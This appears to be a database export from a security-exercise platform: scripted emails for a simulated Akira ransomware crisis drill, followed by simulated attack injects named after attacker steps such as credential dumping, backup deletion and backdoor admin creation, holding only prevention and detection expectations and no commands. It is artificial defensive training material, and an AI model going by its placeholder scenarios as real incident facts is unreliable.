d913034e-bd3e-417a-b54b-e26034de7be6	\N	11 - Engagement Request: Ransomware Incident - [Company Name]	\N	{"body":"<p>Sender: Head of IT</p><p>&nbsp;</p><p>Dear ${user.firstname} ,&nbsp;</p><p>Following guidance from our cyber insurance provider, ${insurance_company_name} , we would like to engage your firm to conduct a forensic investigation into a ransomware attack we are currently experiencing. Please confirm your availability and provide details on your engagement process.</p>","subject":"Engagement Request: Ransomware Incident - ${company_name}","expectations":[{"expectation_description":"Initiate Forensic Investigation: Formally engage external experts to analyze the attack and assist with recovery.","expectation_name":"Initiate Forensic Investigation: Formally engage external experts to analyze the attack and assist with recovery.","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	9900	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
fc2ac879-7969-4a9b-9fd5-17550479e60f	\N	0 - Cyber crisis - Incident response exercise brief		{"expectations":[],"subject":"Cyber crisis - Incident response exercise brief","body":"<p>Good morning everyone,</p><p>Throughout the day, you may receive multiple emails related to a simulated cyber crisis. The objective of this exercise is to practice our incident response processes in a controlled environment, identify potential gaps, and enhance our methods and best practices for real high-stress situations.</p><p>Please respond to these emails as if they were part of an actual scenario:</p><ul><li>Describe step-by-step the actions you would take.</li><li>As in a real-life situation, make an effort to follow up when necessary with the relevant information or content.</li></ul><p>Internal communication is encouraged and recommended.</p><p>Have an excellent drill!</p>"}	t	t	0	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
98df8705-a321-42a1-bac9-7a52ea0b89ba	\N	3 - Task Assignment: Initial Triage & System Isolation	\N	{"body":"<p>Sender: IT Security Lead</p><p>&nbsp;</p><p>Team,&nbsp;</p><p>Split into groups.&nbsp;</p><p>Group A: Analyze affected servers and identify the ransomware variant (check ransom note if present).&nbsp;</p><p>Group B: Begin isolating potentially compromised systems from the network. Group C: Review recent system logs for suspicious activity. Report findings every 30 minutes.</p>","subject":"Task Assignment: Initial Triage & System Isolation","expectations":[{"expectation_description":"Rapid Triage & Containment: Identify the threat actor (if possible) and prevent further spread. Accurate and timely reporting is crucial.","expectation_name":"Rapid Triage & Containment","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	1800	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
17149592-a84d-4973-b781-980591b6b0d2	\N	16 - Update: Ongoing IT Security Incident	\N	{"body":"<p>Sender: Head of Communications<br><br>Dear Employees,&nbsp;</p><p>We want to provide an update on the ongoing IT security incident. We have identified the issue as a ransomware attack and are working with leading experts to investigate and resolve it. We understand this may cause continued disruption, and we appreciate your patience. Please remain vigilant and report any suspicious activity. We will provide further updates as soon as possible.</p>","subject":"Update: Ongoing IT Security Incident","expectations":[{"expectation_description":"Maintain Internal Communication: Keep employees informed about the progress of the investigation and any ongoing impact. Reinforce security awareness.","expectation_name":"Maintain Internal Communication","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	16200	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
bbe65a01-3bb3-4572-988e-45dd22cfe70d	\N	18 - Technical Recovery Strategy Overview	\N	{"body":"<p>Sender: Head of IT<br><br>Dear Leadership Team,&nbsp;</p><p>Our current recovery strategy focuses on [Briefly outline recovery approach - e.g., restoring from clean backups, rebuilding compromised systems]. We are prioritizing the restoration of critical business functions. The estimated timeline for full recovery is currently [Estimate], but this is subject to change based on the forensic investigation and recovery process.</p>","subject":"Technical Recovery Strategy Overview","expectations":[{"expectation_description":"Executive Briefing on Recovery: Provide leadership with a high-level overview of the technical recovery plan, timelines, and potential challenges.","expectation_name":"Executive Briefing on Recovery","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	19800	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
00711dfa-a5f9-4e23-b472-f71d9c944459	\N	12 - Statement Regarding Potential IT Security Incident at [Company Name]	\N	{"body":"<p>Sender: Head of Communications<br><br>[For Immediate Release] ${company_name} is aware of a potential IT security incident and is taking immediate steps to investigate and address the situation. Our dedicated teams are working diligently to understand the nature and scope of the incident. We are committed to the security of our data and the continuity of our operations. We will provide further updates as appropriate.</p>","subject":"Statement Regarding Potential IT Security Incident at ${company_name}","expectations":[{"expectation_description":"Manage Media Inquiries: Issue a concise and factual statement in response to media interest, avoiding speculation and protecting sensitive information.","expectation_name":"Manage Media Inquiries","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	10800	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
24a7a5d8-9a0e-44df-947e-7281ebf971d3	\N	5 - URGENT: Potential Cyber Incident - [Company Name]	\N	{"body":"<p>Sender: Head of IT</p><p>&nbsp;</p><p>Hello,&nbsp;</p><p>We are experiencing a potential ransomware attack. Initial assessment points to the Akira variant. Please advise on next steps and our policy coverage.</p>","subject":"URGENT: Potential Cyber Incident - ${company_name}","expectations":[{"expectation_description":"Insurance Engagement: Initiate contact with the cyber insurance provider as per the incident response plan.","expectation_name":"Insurance Engagement","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	3600	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
3ed18277-a353-4ed4-8ae2-5e7b49d1906f	\N	19 - Updated Statement: IT Security Incident at [Company Name] - Investigation Underway	\N	{"body":"<p>Sender: Head of Communications&nbsp;<br><br>[For Immediate Release] ${company_name} is continuing to actively investigate the recent IT security incident. We are working with leading cybersecurity experts to understand the full impact and restore our systems securely and efficiently. Our priority remains the security of our data and the continuity of our services. We will provide further updates when we have more substantial information.</p>","subject":"Updated Statement: IT Security Incident at ${company_name} - Investigation Underway","expectations":[{"expectation_description":"Refined External Communication: Issue updated statements as more information becomes available, maintaining transparency while protecting sensitive details.","expectation_name":"Refined External Communication","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	21600	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
9c94b967-f81b-4235-ad9c-3d24f7447fd0	\N	1 - URGENT: Potential Ransomware Activity Detected	\N	{"body":"<p>Sender: SOC Analyst<br><br>Dear Team,&nbsp;</p><p>Our monitoring systems have flagged unusual network activity and encrypted files on several key servers. Initial analysis suggests a potential ransomware attack. Please investigate immediately and report your findings. Isolate affected systems if necessary.</p>","subject":"URGENT: Potential Ransomware Activity Detected","expectations":[{"expectation_description":"Immediate Investigation & Initial Assessment: Confirm the nature and scope of the attack. Identify affected systems and potential entry points. Begin containment procedures.","expectation_name":"Investigation & Initial Assessment","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	720	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
b22b9082-b90a-4085-bf50-a33bcb2d1419	\N	6 - Preliminary Legal Assessment - Ransomware Incident	\N	{"body":"<p>Sender: Legal Counsel</p><p>&nbsp;</p><p>Following the initial report, we need to consider our legal obligations regarding data breach notification under GDPR and other relevant regulations. Please provide details on the potentially compromised data as soon as possible. Communications, prepare a statement acknowledging the incident without admitting liability.</p>","subject":"Preliminary Legal Assessment - Ransomware Incident","expectations":[{"expectation_description":"Legal and Regulatory Considerations: Begin assessing potential legal ramifications and notification requirements. Coordinate messaging with Communications.","expectation_name":"Legal and Regulatory Considerations","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	4500	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
256904a2-e497-492e-ae5b-4bf41ad8bd3b	\N	9 - Briefing Document: Potential IT Security Incident	\N	{"body":"<p>Sender: Head of Communications<br><br>${spokesperson_name},&nbsp;</p><p>Please find attached a briefing document outlining the confirmed details of the potential IT security incident. Key messages include acknowledging the incident, stating that investigations are underway, and emphasizing our commitment to data security and business continuity.&nbsp;</p><p>Do not speculate on the attacker or the extent of the impact.</p>","subject":"Briefing Document: Potential IT Security Incident","expectations":[{"expectation_description":"External Communication Preparation: Equip the spokesperson with accurate and approved information for potential media inquiries.","expectation_name":"External Communication Preparation","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	8100	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
54d7c137-5d66-40d5-b08a-73b03c4d77c2	\N	13 - Initial Notification of Potential Data Breach - [Company Name]	\N	{"body":"<p>Sender: Legal Counsel<br><br>Dear ${dpa_contact},&nbsp;</p><p>This serves as an initial notification of a potential data breach incident following a suspected ransomware attack at ${company_name}. We are currently assessing the scope of the incident and will provide a more detailed notification within the legally required timeframe.</p>","subject":"Initial Notification of Potential Data Breach - ${company_name}","expectations":[{"expectation_description":"Regulatory Notification (Initial): Fulfill initial notification obligations to the relevant data protection authorities.","expectation_name":"Regulatory Notification (Initial)","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	11700	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
1ddf06c4-dd48-46ba-8079-71fd86753f21	\N	8 - Technical Update: Scope of Impact & Data Assessment Underway	\N	{"body":"<p>Sender: IT Security Lead<br><br>Hi ${head_of_it_name} and ${legal_counsel_name},&nbsp;</p><p>We have identified <strong>[Number]</strong> critical servers and <strong>[Number]</strong> workstations as encrypted. We are currently working to determine the extent of data exfiltration, if any. Initial analysis suggests the attackers gained access through [Suspected Entry Point - e.g., vulnerable VPN, phishing email].</p>","subject":"Technical Update: Scope of Impact & Data Assessment Underway","expectations":[{"expectation_description":"Detailed Technical Assessment: Provide a clearer picture of the attack's impact and potential root cause. Inform Legal about potential data compromise.","expectation_name":"Detailed Technical Assessment","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	7200	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
28edc591-13d5-40fb-af0c-c6058ba82edc	\N	17 - Legal Ramifications Update: Potential Data Breach & Notification Timeline	\N	{"body":"<p>Sender: Legal Counsel<br><br>Following the forensic team's preliminary findings, there is a significant risk of data breach. We need to prepare for potential mandatory notifications to the DPA and affected individuals. We will provide a detailed timeline for these actions based on the ongoing investigation.</p>","subject":"Legal Ramifications Update: Potential Data Breach & Notification Timeline","expectations":[{"expectation_description":"Legal Strategy & Planning: Outline the legal steps required based on the evolving understanding of the incident, particularly regarding data breach notification.","expectation_name":"Legal Strategy & Planning","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	18000	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
08634c92-dde7-42b1-ad92-d29156403795	\N	4 - UPDATE: Ransom Note Found - AKIRA Ransomware Identified	\N	{"body":"<p>Sender: SOC Analyst<br><br>Hi ${it_security_lead_name}, A ransom note has been found on multiple encrypted systems. It identifies the ransomware as \\"Akira\\" and provides a Tor link for payment instructions. Attached is a copy of the ransom note (CAUTION: Do not access the link).</p>","subject":"UPDATE: Ransom Note Found - AKIRA Ransomware Identified","expectations":[{"expectation_description":"Threat Actor Confirmation & Initial Information: Confirm the specific ransomware variant. Do not interact with the attackers or access the provided link.","expectation_name":"Threat Actor Confirmation & Initial Information","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	2700	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
f5b97b9c-4287-4a6c-a643-55b9cd417c3d	\N	10 - RE: URGENT: Potential Cyber Incident - [Company Name] - Initial Guidance	\N	{"body":"<p>Sender: Cyber Insurance Provider Contact</p><p>&nbsp;</p><p>Dear ${head_of_it_name} and ${legal_counsel_name},&nbsp;</p><p>Thank you for the notification. Please preserve all logs and affected systems. We recommend engaging our approved forensic investigation firm, [Forensic Firm Name], to conduct a thorough analysis. We will be in touch shortly to discuss next steps and coverage details.</p>","subject":"RE: URGENT: Potential Cyber Incident - ${company_name} - Initial Guidance","expectations":[{"expectation_description":"External Expert Engagement: Follow the insurer's guidance and initiate contact with the recommended forensic firm.","expectation_name":"External Expert Engagement","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	9000	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
b271eece-2a3d-4fa1-9e5e-60a7eb7aceaf	\N	2 - URGENT: Potential Ransomware Incident	\N	{"body":"<p>Sender: Head of IT<br><br>Team,&nbsp;</p><p>We have a potential ransomware incident. IT Security is investigating. Legal and Communications, please be ready to assess legal and communication implications. CEO, FYI. We will update you as soon as we have more information.</p>","subject":"URGENT: Potential Ransomware Incident","expectations":[{"expectation_description":"Cross-Functional Awareness & Readiness: Legal to consider legal obligations (data breach, notification). Communications to prepare initial holding statements. CEO to be aware of the situation.","expectation_name":"Cross-Functional Awareness & Readiness","expectation_score":100,"expectation_type":"MANUAL","expectation_expectation_group":false}]}	t	t	1200	\N	\N	2026-01-09 14:19:22.879635+00	2026-01-09 14:19:22.879635+00	\N	\N	2790bd39-37d4-4e39-be7e-53f3ca783f86	\N	\N	a0672cc6-82fb-4552-9e7e-6993457ef415	\N	\N
2d3f779a-9f48-4a2b-897b-d2ffeddafbeb	89206193-dbfb-4513-a186-d72c037dda4c	Test - Download Payload		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	0	\N	\N	2026-01-09 14:48:20.290034+00	2026-01-09 14:48:20.290042+00	\N	\N	7ff2f205-598d-4350-9a76-6e19ee6d1a89	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
3689ab59-2542-4f0b-b491-70eb00062b3b	89206193-dbfb-4513-a186-d72c037dda4c	Test - Scan Server		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	159	\N	\N	2026-01-09 15:12:53.285731+00	2026-01-09 15:17:37.759921+00	\N	\N	b0a5f542-34b2-46a5-8376-472f65cbb494	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
0741f4b0-a552-4e11-a814-9b07a5b5a807	89206193-dbfb-4513-a186-d72c037dda4c	Test - Change Wallpaper		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	295	\N	\N	2026-01-09 15:13:19.900503+00	2026-01-09 15:20:56.920289+00	\N	\N	9468489c-8362-45f4-8555-b7b832802789	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
10b4496c-08e3-49fa-916e-83687b041798	89206193-dbfb-4513-a186-d72c037dda4c	Test - Credential Dump		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	271	\N	\N	2026-01-09 15:14:27.386198+00	2026-01-09 15:20:45.069274+00	\N	\N	f899dba0-035b-4310-99de-1f518b73085a	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
e7bcbe49-178b-4f8a-a73e-6c734e2032b7	89206193-dbfb-4513-a186-d72c037dda4c	Test - Scan for Databases		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	644	\N	\N	2026-01-09 15:15:17.100041+00	2026-01-09 15:22:03.271946+00	\N	\N	0a4a063a-b40b-4991-9ab4-99db8ddaeeb9	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
bbcc074e-8500-4862-9ef0-92c0eae2f804	89206193-dbfb-4513-a186-d72c037dda4c	Test - Delete Backup		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	566	\N	\N	2026-01-09 15:14:39.444957+00	2026-01-09 15:21:19.53816+00	\N	\N	ca8102b1-86fe-4518-b519-8162b82692dd	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
e123988d-c196-494a-bdf7-b367b76ef878	89206193-dbfb-4513-a186-d72c037dda4c	Test - Clean Up Server		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	1371	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.283363+00	2026-01-09 15:53:44.085802+00	\N	\N	c82fdadf-44d2-41a3-9f36-218f37836d43	\N	\N	\N	\N	COLLECTING
0cc59d8d-b0d7-428e-bdca-1b371e0a3be4	89206193-dbfb-4513-a186-d72c037dda4c	Test - Escalate and Persist		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	421	\N	\N	2026-01-09 15:14:57.184088+00	2026-01-09 15:20:04.439813+00	\N	\N	c0aea56f-28f4-498e-ace0-38afcfe54c62	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
13833420-5550-4dc9-8a7e-f42befc5b011	89206193-dbfb-4513-a186-d72c037dda4c	Test - Hide as System File		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	70	\N	\N	2026-01-09 15:11:50.190726+00	2026-01-09 15:16:53.034774+00	\N	\N	a04db27d-842a-445b-a070-823c67a172d4	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
56984800-c07d-4aed-814a-11a19c816b26	89206193-dbfb-4513-a186-d72c037dda4c	Test - Download Payload		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	0	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.274422+00	2026-01-09 15:30:17.052384+00	\N	\N	7ff2f205-598d-4350-9a76-6e19ee6d1a89	\N	\N	\N	\N	COLLECTING
0ff9aea1-f772-4314-85ec-2792c114d90b	89206193-dbfb-4513-a186-d72c037dda4c	Test - Create Backdoor Admin		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	521	\N	\N	2026-01-09 15:14:03.696362+00	2026-01-09 15:20:30.3462+00	\N	\N	84ce643f-a82a-4490-b826-4e1495e94e80	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
eeee5cd4-78af-4a10-96aa-0a7276d87e02	89206193-dbfb-4513-a186-d72c037dda4c	Test - Clean Up Desktop		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	1379	\N	\N	2026-01-09 15:13:33.799708+00	2026-01-09 15:20:39.814644+00	\N	\N	9beb3641-606e-46b8-8168-8e9a906f8a3e	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
5e2a54ac-74d9-4191-8a2e-aeb7e480c742	89206193-dbfb-4513-a186-d72c037dda4c	Test - Credential Dump		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	271	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.262632+00	2026-01-09 15:35:19.154823+00	\N	\N	f899dba0-035b-4310-99de-1f518b73085a	\N	\N	\N	\N	COLLECTING
27782be0-6497-48f6-9052-ca59d1a56205	89206193-dbfb-4513-a186-d72c037dda4c	Test - Escalate and Persist		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	421	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.270418+00	2026-01-09 15:37:45.016882+00	\N	\N	c0aea56f-28f4-498e-ace0-38afcfe54c62	\N	\N	\N	\N	COLLECTING
2343768a-1a7b-41bf-920b-ce4efd6cb99d	89206193-dbfb-4513-a186-d72c037dda4c	Test - Delete Backup		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	566	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.278977+00	2026-01-09 15:40:21.45931+00	\N	\N	ca8102b1-86fe-4518-b519-8162b82692dd	\N	\N	\N	\N	COLLECTING
321867c2-adb6-46db-8d13-602ca4bc0c7a	89206193-dbfb-4513-a186-d72c037dda4c	Test - Clean Up Server		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	1320	\N	\N	2026-01-09 15:13:47.206993+00	2026-01-09 15:47:35.261127+00	\N	\N	c82fdadf-44d2-41a3-9f36-218f37836d43	\N	\N	6d525811-c057-422f-8445-8a36e403994b	\N	COLLECTING
635fc963-f7b3-4468-ab3f-ad6271b2a22d	89206193-dbfb-4513-a186-d72c037dda4c	Test - Hide as System File		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	70	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.28999+00	2026-01-09 15:32:32.104998+00	\N	\N	a04db27d-842a-445b-a070-823c67a172d4	\N	\N	\N	\N	COLLECTING
dad12758-dbee-4646-aca3-bacaa332485c	89206193-dbfb-4513-a186-d72c037dda4c	Test - Scan Server		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	159	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.298172+00	2026-01-09 15:34:12.53456+00	\N	\N	b0a5f542-34b2-46a5-8376-472f65cbb494	\N	\N	\N	\N	COLLECTING
0d9e412f-7003-4545-a65f-26184b48b173	89206193-dbfb-4513-a186-d72c037dda4c	Test - Change Wallpaper		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	295	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.329559+00	2026-01-09 15:37:32.825682+00	\N	\N	9468489c-8362-45f4-8555-b7b832802789	\N	\N	\N	\N	COLLECTING
88fb9ac5-0396-4b3e-be00-648b20ec7758	89206193-dbfb-4513-a186-d72c037dda4c	Test - Create Backdoor Admin		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	521	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.336362+00	2026-01-09 15:39:45.132806+00	\N	\N	84ce643f-a82a-4490-b826-4e1495e94e80	\N	\N	\N	\N	COLLECTING
